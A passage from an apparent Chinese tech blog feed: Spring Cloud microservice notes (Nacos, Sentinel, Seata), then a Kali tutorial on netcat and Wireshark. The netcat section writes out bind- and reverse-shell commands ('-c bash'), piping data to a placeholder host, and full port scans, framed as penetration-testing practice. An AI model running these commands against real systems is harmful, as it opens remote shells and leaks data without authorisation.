设置要绑定的消息服务的具体设置</span></span><br><span class="line">      <span class="attr">binders:</span></span><br><span class="line">        <span class="attr">defaultRabbit:</span>  <span class="comment">#表示定义的名称，用于binding整合</span></span><br><span class="line">          <span class="attr">type:</span> <span class="string">rabbit</span> <span class="comment">#消息组件类型</span></span><br><span class="line">          <span class="attr">environment:</span></span><br><span class="line">            <span class="attr">spring:</span></span><br><span class="line">              <span class="attr">rabbitmq:</span></span><br><span class="line">                <span class="attr">host:</span> <span class="number">192.168</span><span class="number">.2</span><span class="number">.106</span> <span class="comment">#rabbit地址</span></span><br><span class="line">                <span class="attr">port:</span> <span class="number">5672</span></span><br><span class="line">                <span class="attr">username:</span> <span class="string">guest</span></span><br><span class="line">                <span class="attr">password:</span> <span class="string">guest</span></span><br><span class="line"></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http:localhost:7001/eureka/</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">lease-renewal-interval-in-seconds:</span> <span class="number">2</span> <span class="comment">#心跳间隔</span></span><br><span class="line">    <span class="attr">lease-expiration-duration-in-seconds:</span> <span class="number">5</span> <span class="comment">#持续时间</span></span><br><span class="line">    <span class="attr">instance-id:</span> <span class="string">send-8801.com</span> <span class="comment">#主机名称</span></span><br><span class="line">    <span class="attr">prefer-ip-address:</span> <span class="literal">true</span> <span class="comment">#访问路径变为IP地址</span></span><br></pre></td></tr></table></figure><blockquote><p>发送服务</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableBinding</span>(Source<span class="class">.<span class="keyword">class</span>) //定义消息的推送管道：生产方使用<span class="title">source</span></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">IMessageProviderImpl</span> <span class="keyword">implements</span> <span class="title">IMessageProvider</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> MessageChannel output; <span class="comment">//消息发送管道</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">send</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        String serial = UUID.randomUUID().toString();</span><br><span class="line">        <span class="comment">/*MessageBuilder使用建造者模式*/</span></span><br><span class="line">        output.send(MessageBuilder.withPayload(serial).build());</span><br><span class="line">        System.out.println(<span class="string">"******serial: "</span> + serial);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="重复消费问题"><a href="#重复消费问题" class="headerlink" title="重复消费问题"></a>重复消费问题</h4><p>如果同一个订单被两个服务获取到，那么就会造成数据错误，Stream中使用group解决。同样一个group内多个消费者是竞争关系。</p><h3 id="Sleuth"><a href="#Sleuth" class="headerlink" title="Sleuth"></a>Sleuth</h3><p>在微服务框架中，一个由客户端发起的请求在后端系统中会经过多个不同的的服务节点调用来协同产生最后的请求结果，每一个前段请求都会彩成一条复杂的分布式服务调用链路,链路中的任何一环出现高延时或错误都会引起整个请求最后的失败。<code>Sleuth</code>是一款分布式链路跟踪组件</p><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--sleuth包含了zipkin--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-zipkin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">zipkin:</span></span><br><span class="line">  <span class="attr">base-url:</span> <span class="string">http://localhost:9411</span> <span class="comment">#管理界面</span></span><br><span class="line"><span class="attr">sleuth:</span></span><br><span class="line">  <span class="attr">sampler:</span></span><br><span class="line">    <span class="attr">probability:</span> <span class="number">1</span> <span class="comment">#采样率在0-1之间，1表示全部采集</span></span><br></pre></td></tr></table></figure><blockquote><p>注意：Sleuth在调用链上每个微服务节点的配置<strong>完全相同</strong>，下面开启监控即可查看调用链。</p></blockquote><p>ref: <span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9mMTc3YTVlMjkxN2Y=">https://www.jianshu.com/p/f177a5e2917f<i class="fa fa-external-link-alt"></i></span></p><h3 id="SpringCloud-Alibaba"><a href="#SpringCloud-Alibaba" class="headerlink" title="SpringCloud Alibaba"></a>SpringCloud Alibaba</h3><h4 id="Nacos–服务注册配置中心"><a href="#Nacos–服务注册配置中心" class="headerlink" title="Nacos–服务注册配置中心"></a>Nacos–服务注册配置中心</h4><p>更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。<br>Nacos: Dynamic Naming and Configuration Service<br>Nacos就是注册中心+配置中心的组合</p><ul><li>替代Eureka做服务注册中心</li><li>替代Config做服务配置中心</li></ul><blockquote><p>下载并体验：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvbmFjb3MvcmVsZWFzZXM=">https://github.com/alibaba/nacos/releases<i class="fa fa-external-link-alt"></i></span></p></blockquote><h4 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML/properties</p></blockquote><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="meta">spring.application.name</span>=<span class="string">nacos-provider</span></span><br><span class="line"><span class="meta">spring.cloud.nacos.discovery.server-addr</span>=<span class="string">127.0.0.1:8848</span></span><br><span class="line"><span class="meta">management.endpoints.web.exposure.include</span>=<span class="string">*</span></span><br></pre></td></tr></table></figure><p>使用IDEA的Copy Configure功能可以直接复制一份微服务，不用重新编写，只需要在VM OPTION那一栏填写指定端口：<code>-Dserver.port</code> = 9011</p><h4 id="CAP"><a href="#CAP" class="headerlink" title="CAP"></a>CAP</h4><p><strong>Nacos支持AP和CP模式切换</strong>，C是所有节点看到的数据是一致的；而A的定义是所有的请求都会收到响应。P是多备份。</p><h4 id="配置中心"><a href="#配置中心" class="headerlink" title="配置中心"></a>配置中心</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--nacos-config--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--nacos-discovery--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>bootstrap.yml</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nacos配置</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">	<span class="attr">port:</span> <span class="number">3377</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line">	<span class="attr">application:</span></span><br><span class="line">		<span class="attr">name:</span> <span class="string">nacos-config-client</span></span><br><span class="line"><span class="attr">cloud:</span></span><br><span class="line">	<span class="attr">nacos:</span></span><br><span class="line">		<span class="attr">discovery:</span></span><br><span class="line">			<span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos 服务注册中心地址</span></span><br><span class="line">		<span class="attr">config:</span></span><br><span class="line">			<span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment">#Nacos 作为配置中心地址</span></span><br><span class="line">			<span class="attr">file-extension:</span> <span class="string">yaml</span> <span class="comment">#指定yaml 格式的配置</span></span><br></pre></td></tr></table></figure><blockquote><p>application.yml</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">	<span class="attr">profiles:</span></span><br><span class="line">		<span class="attr">active:</span> <span class="string">dev</span> <span class="comment">#表示开发环境</span></span><br></pre></td></tr></table></figure><p>Nacos配置中心格式</p><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200723095951047.png" alt="image-20200723095951047"></p><h4 id="Nacos分类配置"><a href="#Nacos分类配置" class="headerlink" title="Nacos分类配置"></a>Nacos分类配置</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200723100728942.png" alt="image-20200723100728942"></p><ul><li><p>Nacos默认的命名空间是public, Namespace主要用来实现隔离。比防说我们现在有三个环境:开发、测试、产环境,我们就可以创建三个Namespace,不同的Namespace之间是隔离的。</p></li><li><p>Group默认是DEFAULT_ GROUP, Group可以把不同的微服务划分到同一个分组里面去</p></li><li><p>Service就是微服务;一个Service可以包含多个Cluster (集群) ，Nacos默认Cluster是DEFAULT, Cluster是对指定微服务的一个虚拟划分。</p></li><li><p>:star:比如说为了容灾,将Service微服务分别部署在了杭州机房和广州机房,这时就可以给杭州机房的Service微服务起一 个集群名称(HZ)，给广州机房的Service微服务起一 个集群名称(GZ) ，还可以尽量让同一个机房的微服务互相调用,以提升性能。</p></li><li><p>最后是Instance,就是微服务的实例。</p></li></ul><h4 id="Nacos集群和持久化配置"><a href="#Nacos集群和持久化配置" class="headerlink" title="Nacos集群和持久化配置"></a>Nacos集群和持久化配置</h4><ul><li>推荐使用docker安装集群，参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL25hY29zLWdyb3VwL25hY29zLWRvY2tlcg==">https://github.com/nacos-group/nacos-docker<i class="fa fa-external-link-alt"></i></span></li><li>安装后会有三个nacos集群，一个mysql。</li><li>Nacos集群一般使用<code>Nginx</code>来反向代理实现负载均衡。</li></ul><p>docker ps查看。</p><h4 id="Sentinel实现熔断与限流"><a href="#Sentinel实现熔断与限流" class="headerlink" title="Sentinel实现熔断与限流"></a>Sentinel实现熔断与限流</h4><blockquote><p><strong>Sentinel</strong>: 分布式系统的流量防卫兵，参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTQlQkIlOEIlRTclQkIlOEQ=">Github<i class="fa fa-external-link-alt"></i></span></p></blockquote><p>Sentinel 分为两个部分:</p><ul><li>核心库（Java 客户端）不依赖任何框架/库，能够运行于所有 Java 运行时环境，同时对 Dubbo / Spring Cloud 等框架也有较好的支持。</li><li>控制台（Dashboard）基于 Spring Boot 开发，打包后可以直接运行，不需要额外的 Tomcat 等应用容器</li></ul><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTYlQjUlODElRTklODclOEYlRTYlOEUlQTclRTUlODglQjYjJUU1JTlGJUJBJUU0JUJBJThFcXBzJUU1JUI5JUI2JUU1JThGJTkxJUU2JTk1JUIwJUU3JTlBJTg0JUU2JUI1JTgxJUU5JTg3JThGJUU2JThFJUE3JUU1JTg4JUI2">QPS和线程数控制<i class="fa fa-external-link-alt"></i></span></p><h4 id="Sentinel流控-关联"><a href="#Sentinel流控-关联" class="headerlink" title="Sentinel流控-关联"></a>Sentinel流控-关联</h4><p>即/A资源关联/B资源，当/B资源受到压力，对/A资源进行流量控制</p><h4 id="Sentinel流控-预热"><a href="#Sentinel流控-预热" class="headerlink" title="Sentinel流控-预热"></a>Sentinel流控-预热</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTklOTklOTAlRTYlQjUlODEtLS0lRTUlODYlQjclRTUlOTAlQUYlRTUlOEElQTg=">Warm Up<i class="fa fa-external-link-alt"></i></span>（<code>RuleConstant.CONTROL_BEHAVIOR_WARM_UP</code>）方式，即预热/冷启动方式。当系统长期处于低水位的情况下，当流量突然增加时，直接把系统拉升到高水位可能瞬间把系统压垮。通过”冷启动”，让通过的流量缓慢增加，在一定时间内逐渐增加到阈值上限，给冷系统一个预热的时间，避免冷系统被压垮。</p><blockquote><p>默认 <code>coldFactor</code> 为 3，即请求 QPS 从 <code>threshold / 3</code> 开始，经预热时长逐渐升至设定的 QPS 阈值。</p></blockquote><h4 id="Sentinel流控-排队等待"><a href="#Sentinel流控-排队等待" class="headerlink" title="Sentinel流控-排队等待"></a>Sentinel流控-排队等待</h4><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTYlQjUlODElRTklODclOEYlRTYlOEUlQTclRTUlODglQjYtJUU1JThDJTgwJUU5JTgwJTlGJUU2JThFJTkyJUU5JTk4JTlGJUU2JUE4JUExJUU1JUJDJThG">匀速排队<i class="fa fa-external-link-alt"></i></span>（<code>RuleConstant.CONTROL_BEHAVIOR_RATE_LIMITER</code>）方式会严格控制请求通过的间隔时间，也即是让请求以均匀的速度通过，对应的是漏桶算法。</p><h4 id="Sentinel流控-降级"><a href="#Sentinel流控-降级" class="headerlink" title="Sentinel流控-降级"></a>Sentinel流控-降级</h4><p>Sentinel <a href="https://github.com/alibaba/Sentinel/wiki/%E7%86%94%E6%96%AD%E9%99%8D%E7%BA%A7" target="_blank" rel="noopener"><strong>熔断降级</strong></a>会在调用链路中某个资源出现不稳定状态时（例如调用超时或异常比例升高），对这个资源的调用进行限制，让请求快速失败，避免影响到其它的资源而导致级联错误。当资源被降级后，在接下来的降级时间窗口之内，对该资源的调用都自动熔断</p><ul><li>平均响应时间 (<code>DEGRADE_GRADE_RT</code>)：当 1s 内持续进入 N 个请求，对应时刻的平均响应时间（秒级）均超过阈值（<code>count</code>，以 ms 为单位），那么在接下的时间窗口（<code>DegradeRule</code> 中的 <code>timeWindow</code>，以 s 为单位）之内，对这个方法的调用都会自动地熔断（抛出 <code>DegradeException</code>）。注意 Sentinel 默认统计的 RT 上限是 4900 ms，<strong>超出此阈值的都会算作 4900 ms</strong>，若需要变更此上限可以通过启动配置项 <code>-Dcsp.sentinel.statistic.max.rt=xxx</code> 来配置。</li><li>异常比例 (<code>DEGRADE_GRADE_EXCEPTION_RATIO</code>)：当资源的每秒请求量 &gt;= N（可配置），并且每秒异常总数占通过量的比值超过阈值（<code>DegradeRule</code> 中的 <code>count</code>）之后，资源进入降级状态，即在接下的时间窗口（<code>DegradeRule</code> 中的 <code>timeWindow</code>，以 s 为单位）之内，对这个方法的调用都会自动地返回。异常比率的阈值范围是 <code>[0.0, 1.0]</code>，代表 0% - 100%。</li><li>异常数 (<code>DEGRADE_GRADE_EXCEPTION_COUNT</code>)：当资源近 1 分钟的异常数目超过阈值之后会进行熔断。注意由于统计时间窗口是分钟级别的，若 <code>timeWindow</code> 小于 60s，则结束熔断状态后仍可能再进入熔断状态。</li></ul><h4 id="Sentinel热点key"><a href="#Sentinel热点key" class="headerlink" title="Sentinel热点key"></a>Sentinel热点key</h4><p>何为热点？热点即经常访问的数据。很多时候我们希望统计某个热点数据中访问频次最高的 Top K 数据，并对其访问进行<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTclODMlQUQlRTclODIlQjklRTUlOEYlODIlRTYlOTUlQjAlRTklOTklOTAlRTYlQjUlODE=">限制<i class="fa fa-external-link-alt"></i></span>。比如：</p><ul><li>商品 ID 为参数，统计一段时间内最常购买的商品 ID 并进行限制</li><li>用户 ID 为参数，针对一段时间内频繁访问的用户 ID 进行限制</li></ul><p>热点参数限流会统计传入参数中的热点参数，并根据配置的限流阈值与模式，对包含热点参数的资源调用进行限流。热点参数限流可以看做是一种特殊的流量控制，仅对包含热点参数的资源调用生效。</p><p>Sentinel 利用 LRU 策略统计最近最常访问的热点参数，结合令牌桶算法来进行参数级别的流控。热点参数限流支持集群模式。</p><h4 id="Sentinel系统规则"><a href="#Sentinel系统规则" class="headerlink" title="Sentinel系统规则"></a>Sentinel系统规则</h4><p>Sentinel <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvU2VudGluZWwvd2lraS8lRTclQjMlQkIlRTclQkIlOUYlRTglODclQUElRTklODAlODIlRTUlQkElOTQlRTklOTklOTAlRTYlQjUlODE=">系统自适应限流<i class="fa fa-external-link-alt"></i></span>从整体维度对应用入口流量进行控制，结合应用的 Load、CPU 使用率、总体平均 RT、入口 QPS 和并发线程数等几个维度的监控指标，通过自适应的流控策略，让系统的入口流量和系统的负载达到一个平衡，让系统尽可能跑在最大吞吐量的同时保证系统整体的稳定性</p><h4 id="SentinelResource自定义配置"><a href="#SentinelResource自定义配置" class="headerlink" title="@SentinelResource自定义配置"></a>@SentinelResource自定义配置</h4><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200724110933099.png" alt="image-20200724110933099"></p><ul><li>fallback管理<strong>内部异常</strong></li><li>blockhandler管理<strong>熔断限流配置</strong>异常（外部）</li></ul><h4 id="Sentinel持久化规则"><a href="#Sentinel持久化规则" class="headerlink" title="Sentinel持久化规则"></a>Sentinel持久化规则</h4><blockquote><p>POM</p></blockquote><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringCloud ailibaba sentineL - datasource -nacos后续做持久化用到--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.csp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sentinel-datasource-nacos<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>YML</p></blockquote><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">datasource :</span></span><br><span class="line">	<span class="attr">ds1:</span></span><br><span class="line">		<span class="attr">nacos:</span></span><br><span class="line">			<span class="attr">server-addr:</span> <span class="string">localhost:8848</span></span><br><span class="line">            <span class="attr">dataId:</span> <span class="string">Cloudalibaba</span> <span class="string">-sentinel-service</span></span><br><span class="line">            <span class="attr">groupId:</span> <span class="string">DEFAULT_GROUP</span></span><br><span class="line">            <span class="attr">data-type:</span> <span class="string">json</span></span><br><span class="line">            <span class="attr">rule -type:</span> <span class="string">flow</span></span><br></pre></td></tr></table></figure><blockquote><p>去Nacos控制台创建json配置文件</p></blockquote><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"resource"</span>: <span class="string">"/rateLimit/byUrl"</span>,</span><br><span class="line">        <span class="attr">"limitApp"</span>: <span class="string">"default"</span>,</span><br><span class="line">        <span class="attr">"grade"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"count"</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">"strategy"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"controlBehavior"</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">"clusterMode"</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="Senta处理分布式事务"><a href="#Senta处理分布式事务" class="headerlink" title="Senta处理分布式事务"></a>Senta处理分布式事务</h3><p><span class="exturl" data-url="aHR0cHM6Ly9zZWF0YS5pby96aC1jbi9kb2NzL292ZXJ2aWV3L3doYXQtaXMtc2VhdGEuaHRtbA==">官网<i class="fa fa-external-link-alt"></i></span></p><h4 id="TC-Transaction-Coordinator-事务协调者"><a href="#TC-Transaction-Coordinator-事务协调者" class="headerlink" title="TC (Transaction Coordinator) - 事务协调者"></a>TC (Transaction Coordinator) - 事务协调者</h4><p>维护全局和分支事务的状态，驱动全局事务提交或回滚。</p><h4 id="TM-Transaction-Manager-事务管理器"><a href="#TM-Transaction-Manager-事务管理器" class="headerlink" title="TM (Transaction Manager) - 事务管理器"></a>TM (Transaction Manager) - 事务管理器</h4><p>定义全局事务的范围：开始全局事务、提交或回滚全局事务。</p><h4 id="RM-Resource-Manager-资源管理器"><a href="#RM-Resource-Manager-资源管理器" class="headerlink" title="RM (Resource Manager) - 资源管理器"></a>RM (Resource Manager) - 资源管理器</h4><p>管理分支事务处理的资源，与TC交谈以<strong>注册分支事务</strong>和<strong>报告分支事务的状态</strong>，并驱动分支事务提交或回滚。</p><p>Senta的AT模式是来自于两阶段过程的改进</p>]]></content>
      <categories>
        <category>Spring框架</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>微服务</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali使用教程（一）：常用命令和基本工具使用</title>
    <url>/2020/06/12/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%92%8C%E5%9F%BA%E6%9C%AC%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li><code>netstat -pantu</code> ：查看本机与外界的TCP/UDP连接</li><li><code>sudo passwd root</code>：为root设置密码</li></ul><a id="more"></a><h3 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h3><h4 id="NC-NETCAT"><a href="#NC-NETCAT" class="headerlink" title="NC-NETCAT"></a><code>NC-NETCAT</code></h4><blockquote><p>nc是一款远程传输，控制工具。使用nc -h 命令查看参数描述</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608153428232.png" alt="image-20200608153428232"></p><h5 id="NC——获取Banner信息"><a href="#NC——获取Banner信息" class="headerlink" title="NC——获取Banner信息"></a>NC——获取Banner信息</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nv x.x.x.x port  nc作为客户端连接对方服务器</span><br><span class="line">说明：</span><br><span class="line">	-v 显示详细信息</span><br><span class="line">	-n 后面添加ip地址，不会进行DNS解析</span><br></pre></td></tr></table></figure><p>测试：</p><blockquote><p>首先使用ping + 域名 获取ip地址</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608105457977.png" alt="image-20200608105457977"></p><blockquote><p>由于pop3的端口为110，直接用nc -nv命令连接</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608110108800.png" alt="image-20200608110108800"></p><h5 id="NC——传输文本（Telnet）"><a href="#NC——传输文本（Telnet）" class="headerlink" title="NC——传输文本（Telnet）"></a>NC——传输文本（Telnet）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">A:nc -l -p port 监听端port端口</span><br><span class="line">B:nc -nv x.x.x.x port 发送端,x.x.x.x为监听端ip</span><br><span class="line"></span><br><span class="line">用途：电子取证、信息收集</span><br><span class="line"></span><br><span class="line">示例：我们希望将远程服务端的文件目录发送到本机，并且不显示远程主机上，可以使用如下命令:</span><br><span class="line"></span><br><span class="line">远程服务器：ls -l | nc -nv x.x.x.x port -q 1 这里-q 1表示发送完成后等待1s时间就退出nc</span><br><span class="line"></span><br><span class="line">接收端：nc -l -p port &gt; log.txt 监听并将信息保存在log.txt文件中大萨达</span><br></pre></td></tr></table></figure><h5 id="NC——传输文件-目录"><a href="#NC——传输文件-目录" class="headerlink" title="NC——传输文件/目录"></a>NC——传输文件/目录</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">传输文件: </span><br><span class="line">	从B--&gt;A</span><br><span class="line">	A: nc -lp port &gt; video.mp4</span><br><span class="line">	B: nc -nv x.x.x.x port &lt; video.mp4 -q 1 </span><br><span class="line">			&lt;符号表示传入数据，&gt;符号表示保存数据</span><br><span class="line">	</span><br><span class="line">    也可以从A--&gt;B</span><br><span class="line">    A: nc -lp port &lt; video.mp4 -q 1 </span><br><span class="line">	B: nc -nv x.x.x.x port &gt; video.mp4 </span><br><span class="line"></span><br><span class="line">传输目录：</span><br><span class="line">	原理类似，只不过需要在传输过程对目录打包和解压</span><br><span class="line">	A:tar -cvf - /music | nc -l -p port -q 1</span><br><span class="line">	B:nc -nv x.x.x.x port | tar -xvf -</span><br></pre></td></tr></table></figure><h5 id="NC——端口扫描（不太准确，不常用）"><a href="#NC——端口扫描（不太准确，不常用）" class="headerlink" title="NC——端口扫描（不太准确，不常用）"></a>NC——端口扫描（不太准确，不常用）</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -nvz x.x.x.x 1-65535 探测所有tcp端口</span><br><span class="line">nc -nvzu x.x.x.x 1-1024	探测udp端口</span><br></pre></td></tr></table></figure><h5 id="NC——远程控制"><a href="#NC——远程控制" class="headerlink" title="NC——远程控制"></a>NC——远程控制</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">正向控制：</span><br><span class="line">	A:nc -lp port -c bash A提供bash</span><br><span class="line">	B:nc x.x.x.x port B使用bash</span><br><span class="line">	</span><br><span class="line">反向控制： </span><br><span class="line">	A:nc -lp port A使用bash</span><br><span class="line">	B:nc x.x.x.x port -c bash B提供bash</span><br><span class="line">	</span><br><span class="line">思考：在渗透测试中，正向控制一般是会被防火墙拦截的，所以可以尝试反向控制，让服务端连接自己暴露的端口</span><br><span class="line"></span><br><span class="line">注意：Windwos平台将bash改成cmd</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><blockquote><p>NC缺乏加密和身份验证的能力，不安全。可以使用NCAT来弥补NC的不足， 因为它是支持SSL加密，NCAT包含于nmap中</p></blockquote><h4 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><code>Wireshark</code></h4><blockquote><p>Wireshark是一款抓包嗅探、协议分析的工具。</p></blockquote><h5 id="使用wireshark抓包"><a href="#使用wireshark抓包" class="headerlink" title="使用wireshark抓包"></a>使用wireshark抓包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">这里以抓取本机网卡数据包为例。首先打开终端，尝试ping百度</span><br><span class="line"></span><br><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">同时打开wireshark，选则虚拟机网卡eth0，再启动抓包</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608163108785.png" alt="image-20200608163108785"></p><blockquote><p>这里可以保存抓包数据文件，建议保存为pcap格式，兼容性较好。</p></blockquote><h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><blockquote><p>wireshark可以针对ip、域名、协议进行过滤，支持组合表达式，称为过滤器。如下图中，可以选则当前协议行作为过滤器应用。</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200608165600432.png" alt="image-20200608165600432"></p><h5 id="常见协议包"><a href="#常见协议包" class="headerlink" title="常见协议包"></a>常见协议包</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wireshark默认通过端口来识别协议类型，如80端口识别为http，如有必要需要手动指定协议类型</span><br><span class="line"></span><br><span class="line">数据包协议如下：ARP、ICMP、TCP、UDP、DNS、http、ftp</span><br><span class="line"></span><br><span class="line">TCP数据流：HTTP、SMTP、POP3、SSL/TLS（加密传输，无法查看内容）</span><br></pre></td></tr></table></figure><h5 id="统计分析"><a href="#统计分析" class="headerlink" title="统计分析"></a>统计分析</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">follow</span> tcp <span class="keyword">stream：查看传输内容</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span 